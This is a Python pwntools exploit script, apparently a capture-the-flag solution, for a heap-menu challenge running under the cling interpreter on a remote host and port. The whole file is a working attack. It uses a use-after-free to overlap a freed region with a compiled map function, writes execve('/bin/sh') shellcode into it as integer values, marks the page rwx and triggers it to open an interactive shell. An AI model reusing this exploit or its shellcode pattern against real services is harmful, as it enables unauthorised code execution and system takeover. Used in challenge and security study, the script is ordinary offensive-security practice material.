#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "34.146.101.4"
PORT = 30003


def create(size, vals):
    r.sendline("1")
    r.sendlineafter(">", str(size))

    for val in vals:
        r.sendline(val)

    r.recvuntil("> ")


def setprot(rd, wr, exe):
    r.sendline("2")
    r.sendlineafter(">", "y" if rd else "n")
    r.sendlineafter(">", "y" if wr else "n")
    r.sendlineafter(">", "y" if exe else "n")
    r.recvuntil("> ")


def setmap(func):
    r.sendline("4")
    r.sendlineafter("> ", func)
    r.recvuntil(" = ")
    resp = r.recvline()[:-1]
    r.recvuntil("> ")
    return resp


def delete():
    r.sendline("3")
    r.recvuntil("> ")


def exploit(r):
    r.recvuntil("> ")

    size = 1000/8

    create(size, ["+"])    # create a mmapped region
    delete()               # free it
    # create map function (will be created in the just freed region)
    setmap("x")
    delete()               # free the map function region (via buf from create)

    # put shellcode on freed page (compiled map function pointing there)
    SC = """
		xor rax, rax
		mov al, 59
		mov rdi, rdx
		add rdi, 0x28
		xor rsi, rsi
		xor rdx, rdx
		syscall
	"""

    l = []

    context.arch = "amd64"
    payload = asm(SC)
    payload = payload.ljust(40, "\x90")
    payload += "/bin/sh\x00"

    for i in range(0, 0xa0/8):
        l.append("1")

    for i in range(0, len(payload), 8):
        l.append(str(u64(payload[i:i+8].ljust(8, "\x90"))))

    create(len(l), l)
    setprot(True, True, True)         # make our region rwx

    # execute run_map
    r.sendline("5")

    r.interactive()

    return


if __name__ == "__main__":
    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        with open("chall.c", "r") as f:
            data = f.read()

        r = process(["./cling/bin/cling", "--nologo"])
        r.send(data)
        print(util.proc.pidof(r))
        pause()

    exploit(r)
